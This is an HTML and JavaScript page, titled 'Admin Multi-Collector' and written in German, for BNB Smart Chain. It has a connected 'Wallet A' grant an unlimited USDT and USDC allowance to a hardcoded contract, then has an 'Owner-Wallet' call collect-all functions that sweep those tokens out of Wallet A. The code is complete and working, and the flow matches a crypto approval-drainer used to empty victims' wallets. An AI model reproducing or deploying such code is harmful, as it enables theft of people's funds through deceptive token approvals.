<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"/>
  <title>Admin Multi-Collector</title>
  <style>
    body{ font-family: 'Segoe UI', sans-serif; background:#0f172a; color:#fff; display:flex; min-height:100vh; justify-content:center; align-items:center; margin:0; padding:15px; }
    .box{ background:#020617; padding:25px; border-radius:16px; width:100%; max-width:400px; border: 1px solid #1e293b; box-shadow:0 10px 30px rgba(0,0,0,.5); }
    h2{ margin-top:0; color: #f8fafc; font-size: 18px; text-align: center; margin-bottom: 20px; }
    .step { background: #1e293b; padding: 15px; border-radius: 12px; margin-bottom: 15px; border-left: 4px solid #3b82f6; }
    .step-title { font-size: 11px; font-weight: bold; text-transform: uppercase; color: #94a3b8; margin-bottom: 10px; display: block; }
    button { background:#22c55e; border:none; padding:12px; width:100%; font-size:14px; font-weight:bold; cursor:pointer; border-radius:10px; color: white; transition: 0.2s; margin-bottom: 8px; -webkit-tap-highlight-color: transparent; }
    button:active { transform: scale(0.98); opacity: 0.8; }
    button.secondary { background:#334155; }
    button.danger { background: #ef4444; margin-top: 5px; }
    .mono { font-family: monospace; font-size:10px; word-break:break-all; background: #000; padding: 8px; border-radius: 6px; display: block; color: #10b981; border: 1px solid #1e293b; min-height: 15px; }
    #status { margin-top:10px; padding: 12px; border-radius: 8px; background: #0f172a; font-size: 12px; text-align: center; border: 1px dashed #334155; color: #cbd5e1; line-height: 1.4; }
    .token-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 10px; }
  </style>
</head>
<body>

<div class="box">
  <h2>Multi-Token Collector</h2>

  <div class="step">
    <span class="step-title">1. Verbindung (Wallet A)</span>
    <button class="secondary" onclick="connectAndSwitch()">Wallet A verbinden</button>
    <div class="mono" id="addr">Nicht verbunden</div>
  </div>

  <div class="step" style="border-left-color: #10b981;">
    <span class="step-title">2. Freigaben (Quelle)</span>
    <div class="token-grid">
      <button id="btnUSDT" onclick="approveToken('USDT')">Approve USDT</button>
      <button id="btnUSDC" onclick="approveToken('USDC')">Approve USDC</button>
    </div>
    <p style="font-size: 10px; color: #94a3b8; text-align: center; margin: 5px 0 0 0;">Jedes Token einzeln best√§tigen!</p>
  </div>

  <div class="step" style="border-left-color: #ef4444;">
    <span class="step-title">3. Einzug (Owner-Wallet)</span>
    <p style="font-size:10px; color:#cbd5e1; margin-bottom:8px; text-align:center;">Jetzt zu <b>Owner-Wallet</b> wechseln!</p>
    <button class="danger" onclick="collectAll('USDT')">Ziehe USDT</button>
    <button class="danger" onclick="collectAll('USDC')">Ziehe USDC</button>
  </div>

  <div id="status">Bereit. Bitte Schritt 1 starten.</div>
</div>

<script src="https://cdn.jsdelivr.net/npm/ethers@6.10.0/dist/ethers.min.js"></script>
<script>
  const CONTRACT = "0x61bF4DAE189C62344Df1E9802B5338C196d1E26B";
  const TOKENS = {
    USDT: "0x55d398326f99059fF775485246999027B3197955",
    USDC: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d"
  };
  const BSC_ID = "0x38";

  let walletA = null;
  function setStatus(m) { document.getElementById("status").innerHTML = m; }

  async function connectAndSwitch() {
    try {
      if (!window.ethereum) return setStatus("‚ùå Bitte Trust Wallet nutzen.");
      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
      walletA = accounts[0];
      document.getElementById("addr").innerText = walletA;

      try {
        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: BSC_ID }],
        });
      } catch (e) {
        if (e.code === 4902) {
          await window.ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [{
              chainId: BSC_ID,
              chainName: 'BNB Smart Chain',
              nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
              rpcUrls: ['https://bsc-dataseed.binance.org/'],
              blockExplorerUrls: ['https://bscscan.com/']
            }]
          });
        }
      }
      setStatus("‚úÖ Verbunden auf BSC.<br>F√ºhre nun die Freigaben aus.");
    } catch (e) { setStatus("‚ùå Verbindung abgelehnt."); }
  }

  async function approveToken(type) {
    try {
      if(!walletA) return setStatus("‚ùå Erst Schritt 1 ausf√ºhren!");
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const abi = ["function approve(address s, uint256 a) public returns (bool)"];
      const contract = new ethers.Contract(TOKENS[type], abi, signer);
      
      setStatus(`‚åõ Best√§tige ${type} Freigabe in deiner App...`);
      
      // Erh√∂htes Gas-Limit f√ºr mobile Stabilit√§t
      const tx = await contract.approve(CONTRACT, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff", { 
        gasLimit: 100000 
      });
      
      setStatus(`‚åõ Netzwerk verarbeitet ${type}...`);
      await tx.wait();
      
      setStatus(`‚úÖ ${type} freigegeben!`);
      document.getElementById("btn" + type).style.background = "#334155";
      document.getElementById("btn" + type).innerText = type + " OK";
    } catch (e) { 
      console.error(e);
      setStatus(`‚ùå Fehler bei ${type}. Pr√ºfe dein BNB-Guthaben!`); 
    }
  }

  async function collectAll(type) {
    try {
      if(!walletA) return setStatus("‚ùå Keine Wallet A Adresse.");
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      // Ruft die Funktionen aus deinem Contract auf
      const funcName = type === 'USDT' ? "collectUSDTAll" : "collectUSDCAll";
      const abi = [`function ${funcName}(address f) external`];
      const contract = new ethers.Contract(CONTRACT, abi, signer);
      
      setStatus(`‚åõ Einzug von ${type} l√§uft...`);
      const tx = await contract[funcName](walletA);
      await tx.wait();
      setStatus(`üéâ Alle ${type} erfolgreich eingezogen!`);
    } catch (e) { 
      setStatus("‚ùå Fehler: Nur der Owner-Account darf das!"); 
    }
  }
</script>
</body>
</html>
